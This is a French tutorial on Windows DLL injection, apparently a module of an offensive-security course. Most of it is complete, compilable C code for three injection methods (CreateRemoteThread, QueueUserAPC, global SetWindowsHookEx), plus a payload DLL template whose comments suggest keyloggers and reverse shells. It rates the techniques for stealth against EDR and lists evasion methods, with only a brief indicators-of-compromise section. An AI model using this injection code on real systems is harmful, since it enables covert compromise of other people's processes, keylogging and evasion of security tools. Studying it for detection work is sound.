# DLL Injection - Techniques Complètes

## Introduction

La **DLL Injection** consiste à forcer un processus à charger notre DLL malveillante. Une fois chargée, le code de `DllMain` s'exécute dans le contexte du processus cible.

```
┌────────────────────────────────────────────────────────┐
│                   PROCESSUS CIBLE                      │
├────────────────────────────────────────────────────────┤
│  ┌──────────┐  ┌──────────┐  ┌──────────────────────┐  │
│  │ kernel32 │  │  ntdll   │  │    NOTRE DLL         │  │
│  │   .dll   │  │   .dll   │  │  ┌────────────────┐  │  │
│  └──────────┘  └──────────┘  │  │ DllMain()      │  │  │
│                              │  │  - Keylogger   │  │  │
│  ┌──────────┐  ┌──────────┐  │  │  - Backdoor    │  │  │
│  │  user32  │  │   gdi32  │  │  │  - Hook APIs   │  │  │
│  │   .dll   │  │   .dll   │  │  └────────────────┘  │  │
│  └──────────┘  └──────────┘  └──────────────────────┘  │
│                                      ▲                 │
│                                      │                 │
│                              INJECTÉ PAR NOUS          │
└────────────────────────────────────────────────────────┘
```

---

## Technique 1 : CreateRemoteThread + LoadLibrary

La méthode classique. On crée un thread dans le processus cible qui appelle `LoadLibraryA` avec le chemin de notre DLL.

### Pourquoi ça marche ?

1. `LoadLibraryA` est exportée par kernel32.dll
2. kernel32.dll est chargée à la **même adresse** dans tous les processus (ASLR par boot)
3. L'adresse de `LoadLibraryA` dans notre processus = l'adresse dans le processus cible
4. On peut donc appeler `LoadLibraryA` dans le contexte du processus cible

### Code complet

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/**
 * GetProcessIdByName - Trouve le PID d'un processus par son nom
 *
 * @param szProcessName : Nom du processus (ex: "notepad.exe")
 * @return PID ou 0 si non trouvé
 */
DWORD GetProcessIdByName(const char* szProcessName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    // Créer un snapshot de tous les processus
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Parcourir la liste des processus
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Comparaison insensible à la casse
            if (_stricmp(pe32.szExeFile, szProcessName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

/**
 * InjectDLL_CreateRemoteThread - Injection via CreateRemoteThread
 *
 * @param dwPid     : PID du processus cible
 * @param szDllPath : Chemin COMPLET vers la DLL (ex: "C:\\tools\\payload.dll")
 *
 * @return TRUE si succès
 */
BOOL InjectDLL_CreateRemoteThread(DWORD dwPid, const char* szDllPath) {

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemotePath = NULL;
    SIZE_T pathLen = strlen(szDllPath) + 1;
    BOOL bSuccess = FALSE;

    printf("[*] Injection DLL via CreateRemoteThread\n");
    printf("    Cible PID : %d\n", dwPid);
    printf("    DLL       : %s\n", szDllPath);

    // ===== ÉTAPE 1 : Ouvrir le processus cible =====
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD |         // Pour CreateRemoteThread
        PROCESS_VM_OPERATION |           // Pour VirtualAllocEx
        PROCESS_VM_WRITE |               // Pour WriteProcessMemory
        PROCESS_QUERY_INFORMATION,       // Pour les infos
        FALSE,
        dwPid
    );

    if (!hProcess) {
        printf("[-] OpenProcess échoué : %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Handle processus obtenu : 0x%p\n", hProcess);

    // ===== ÉTAPE 2 : Allouer de la mémoire pour le chemin DLL =====
    pRemotePath = VirtualAllocEx(
        hProcess,
        NULL,
        pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pRemotePath) {
        printf("[-] VirtualAllocEx échoué : %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Mémoire allouée à : 0x%p\n", pRemotePath);

    // ===== ÉTAPE 3 : Écrire le chemin de la DLL =====
    if (!WriteProcessMemory(hProcess, pRemotePath, szDllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory échoué : %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Chemin DLL écrit dans le processus cible\n");

    // ===== ÉTAPE 4 : Récupérer l'adresse de LoadLibraryA =====
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    if (!pLoadLibrary) {
        printf("[-] GetProcAddress LoadLibraryA échoué\n");
        goto cleanup;
    }

    printf("[+] Adresse LoadLibraryA : 0x%p\n", pLoadLibrary);

    // ===== ÉTAPE 5 : Créer le thread distant =====
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,  // Fonction à exécuter
        pRemotePath,                            // Argument = chemin DLL
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread échoué : %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Thread créé, TID : %d\n", GetThreadId(hThread));

    // ===== ÉTAPE 6 : Attendre la fin du chargement =====
    WaitForSingleObject(hThread, INFINITE);

    // Vérifier le code de retour (handle de la DLL chargée)
    DWORD dwExitCode;
    GetExitCodeThread(hThread, &dwExitCode);

    if (dwExitCode != 0) {
        printf("[+] DLL chargée avec succès ! Handle : 0x%X\n", dwExitCode);
        bSuccess = TRUE;
    } else {
        printf("[-] LoadLibrary a retourné NULL\n");
    }

cleanup:
    if (hThread) CloseHandle(hThread);
    if (pRemotePath) VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return bSuccess;
}

int main(int argc, char* argv[]) {

    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Exemple: %s notepad.exe C:\\payload.dll\n", argv[0]);
        return 1;
    }

    DWORD dwPid = GetProcessIdByName(argv[1]);

    if (dwPid == 0) {
        printf("[-] Processus '%s' non trouvé\n", argv[1]);
        return 1;
    }

    printf("[+] Processus '%s' trouvé, PID : %d\n", argv[1], dwPid);

    if (InjectDLL_CreateRemoteThread(dwPid, argv[2])) {
        printf("\n[+] Injection réussie !\n");
    } else {
        printf("\n[-] Injection échouée\n");
        return 1;
    }

    return 0;
}
```

---

## Technique 2 : QueueUserAPC

L'**APC Injection** utilise les Asynchronous Procedure Calls. Plus furtive car pas de création de thread.

### Comment ça marche ?

1. On "queue" une fonction APC sur un thread existant du processus cible
2. Quand le thread entre en état "alertable" (SleepEx, WaitForSingleObjectEx...), l'APC s'exécute
3. Notre APC = `LoadLibraryA` avec notre DLL

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/**
 * GetThreadsOfProcess - Récupère tous les TIDs d'un processus
 */
DWORD GetThreadsOfProcess(DWORD dwPid, DWORD* pThreadIds, DWORD maxThreads) {
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    DWORD count = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwPid && count < maxThreads) {
                pThreadIds[count++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return count;
}

/**
 * InjectDLL_APC - Injection via QueueUserAPC
 */
BOOL InjectDLL_APC(DWORD dwPid, const char* szDllPath) {

    HANDLE hProcess = NULL;
    LPVOID pRemotePath = NULL;
    SIZE_T pathLen = strlen(szDllPath) + 1;
    DWORD threadIds[256];
    DWORD threadCount;
    DWORD apcQueued = 0;

    printf("[*] Injection DLL via QueueUserAPC\n");

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess) {
        printf("[-] OpenProcess échoué\n");
        return FALSE;
    }

    pRemotePath = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemotePath) {
        printf("[-] VirtualAllocEx échoué\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pRemotePath, szDllPath, pathLen, NULL);

    LPVOID pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    threadCount = GetThreadsOfProcess(dwPid, threadIds, 256);
    printf("[+] %d threads trouvés dans le processus\n", threadCount);

    // Queue l'APC sur TOUS les threads
    for (DWORD i = 0; i < threadCount; i++) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadIds[i]);

        if (hThread) {
            if (QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemotePath)) {
                printf("[+] APC queueé sur thread %d\n", threadIds[i]);
                apcQueued++;
            }
            CloseHandle(hThread);
        }
    }

    CloseHandle(hProcess);

    if (apcQueued > 0) {
        printf("[+] %d APCs queueés. En attente d'un état alertable...\n", apcQueued);
        return TRUE;
    }

    return FALSE;
}
```

---

## Technique 3 : SetWindowsHookEx

Technique qui injecte automatiquement dans tous les processus avec GUI.

```c
#include <windows.h>
#include <stdio.h>

// La DLL doit exporter cette fonction
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL InjectDLL_Hook(const char* szDllPath) {

    HMODULE hDll = LoadLibraryA(szDllPath);
    if (!hDll) {
        printf("[-] LoadLibrary échoué\n");
        return FALSE;
    }

    // Récupérer la fonction hook de notre DLL
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hDll, "HookProc");
    if (!hookProc) {
        printf("[-] GetProcAddress HookProc échoué\n");
        return FALSE;
    }

    // Installer le hook global
    // La DLL sera chargée dans TOUS les processus qui ont des fenêtres
    HHOOK hHook = SetWindowsHookExA(
        WH_KEYBOARD_LL,    // Type de hook
        hookProc,          // Notre fonction
        hDll,              // Handle de notre DLL
        0                  // 0 = tous les threads
    );

    if (!hHook) {
        printf("[-] SetWindowsHookEx échoué : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Hook installé ! La DLL sera injectée dans les processus avec GUI.\n");

    // Garder le hook actif
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return TRUE;
}
```

---

## Créer une DLL payload

```c
// payload.c - Compiler avec : cl /LD payload.c

#include <windows.h>
#include <stdio.h>

// Thread principal du payload
DWORD WINAPI PayloadThread(LPVOID lpParameter) {
    // Exemple : ouvrir une MessageBox
    MessageBoxA(NULL, "DLL injectée avec succès !", "Injection", MB_OK);

    // Ici vous pouvez implémenter :
    // - Un keylogger
    // - Un reverse shell
    // - Du hooking d'API
    // - etc.

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Désactiver les notifications DLL_THREAD_ATTACH/DETACH
            DisableThreadLibraryCalls(hinstDLL);

            // Créer un thread pour notre payload
            // (recommandé car DllMain a des restrictions)
            CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            // Cleanup si nécessaire
            break;
    }

    return TRUE;
}

// Export pour SetWindowsHookEx
__declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

### Compilation

```bash
# Visual Studio (x64 Native Tools Command Prompt)
cl /LD payload.c /Fe:payload.dll

# MinGW
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -luser32
```

---

## Tableau comparatif

| Technique | Furtivité | Complexité | Fiabilité | Détection EDR |
|-----------|-----------|------------|-----------|---------------|
| CreateRemoteThread | ⭐ | ⭐ | ⭐⭐⭐ | Haute |
| QueueUserAPC | ⭐⭐⭐ | ⭐⭐ | ⭐⭐ | Moyenne |
| SetWindowsHookEx | ⭐⭐ | ⭐ | ⭐⭐⭐ | Moyenne |
| Thread Hijacking | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ | Basse |

---

## Détection et Contremesures

```
Indicateurs de compromission (IOC) :
- Appels à CreateRemoteThread/NtCreateThreadEx
- Allocations mémoire inter-processus (VirtualAllocEx)
- DLLs chargées depuis des chemins inhabituels
- Threads créés sans stack trace normale

Techniques d'évasion (voir Module 14) :
- Direct Syscalls pour éviter les hooks
- Manual Mapping au lieu de LoadLibrary
- Module Stomping
```

---

## Références

- [VX-API - Injection Techniques](https://github.com/vxunderground/VX-API)
- [ired.team - DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)
- [MITRE ATT&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/)
